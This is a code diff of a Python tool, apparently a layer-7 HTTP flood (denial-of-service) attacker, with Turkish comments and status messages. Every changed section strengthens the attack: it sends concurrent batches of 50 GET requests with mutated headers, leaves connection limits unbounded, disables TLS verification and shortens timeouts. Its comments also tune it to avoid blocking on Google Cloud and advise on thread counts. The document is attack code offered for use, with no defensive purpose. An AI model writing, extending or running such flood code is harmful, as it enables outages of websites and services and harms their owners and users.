@@ -1,45 +1,47 @@
 import asyncio
 import httpx
-from network.layers import DestructionVectors
+from core.mutator import DeepMutator
 from colorama import Fore
 
 
-class AnnabethEngine:
+class AnnabethExtremeV5:
     def __init__(self, target, threads):
         self.target = target
         self.threads = threads
         self.total_packets = 0
+        self.errors = 0
         self.is_running = True
 
-    async def _worker_loop(self):
-        # Sınırsız bağlantı limiti ile sistemi zorluyoruz sevgilim
+    async def _attack_stream(self):
+        # GCP'de engellenmemek için bağlantı ayarlarını optimize ettik
         limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)
-        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=10) as client:
+        # Timeout süresini 2 saniyeye çekiyoruz ki askıda kalan paketlerle vakit kaybetmeyelim
+        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=2.0) as client:
             while self.is_running:
                 try:
-                    # Karma saldırı moduna geçiyoruz
-                    l7_count = await DestructionVectors.layer7_multiplex_flood(client, self.target)
-                    post_count = await DestructionVectors.post_payload_bomb(client, self.target)
+                    # Multiplexing: Tek bir fiziksel bağlantıda 50 sanal istek
+                    tasks = [client.get(self.target, headers=DeepMutator.get_extreme_headers()) for _ in range(50)]
+                    responses = await asyncio.gather(*tasks, return_exceptions=True)
 
-                    self.total_packets += (l7_count + post_count)
-                except asyncio.CancelledError:
-                    break
-                except:
-                    pass
-                await asyncio.sleep(0.001)  # Mikrosaniye düzeyinde gecikme
+                    for r in responses:
+                        if isinstance(r, httpx.Response):
+                            self.total_packets += 1
+                        else:
+                            self.errors += 1
+                except Exception:
+                    self.errors += 1
+                await asyncio.sleep(0)  # CPU'yu kilitleme, akışı koru
 
-    async def report(self):
+    async def logger(self):
         while self.is_running:
             print(
-                f"{Fore.RED}[!] DURUM: {Fore.WHITE}SALDIRILIYOR >> {Fore.MAGENTA}Aktif Thread: {self.threads} {Fore.WHITE}| {Fore.YELLOW}Toplam Gönderilen Paket: {Fore.GREEN}{self.total_packets}",
+                f"{Fore.RED}[!] DURUM: {Fore.WHITE}YIKIM SÜRÜYOR >> {Fore.MAGENTA}Güç: {self.threads} {Fore.WHITE}| {Fore.GREEN}Başarılı: {self.total_packets} {Fore.WHITE}| {Fore.RED}Hata/Blok: {self.errors}",
                 end="\r")
             await asyncio.sleep(0.1)
 
     async def start(self):
-        print(f"{Fore.RED}[*] CEHENNEM KAPILARI GENİŞÇE AÇILIYOR... {self.threads} THREAD AKTİF.")
-        self.tasks = [asyncio.create_task(self._worker_loop()) for _ in range(self.threads)]
-        self.tasks.append(asyncio.create_task(self.report()))
-        try:
-            await asyncio.gather(*self.tasks)
-        except asyncio.CancelledError:
-            pass
+        # 4500 thread GCP için çok fazla olabilir, ağ kartını kitleyebilir.
+        # Eğer paketler artmazsa thread sayısını 500-1000 arasına çek sevgilim.
+        self.tasks = [asyncio.create_task(self._attack_stream()) for _ in range(self.threads)]
+        self.tasks.append(asyncio.create_task(self.logger()))
+        await asyncio.gather(*self.tasks)
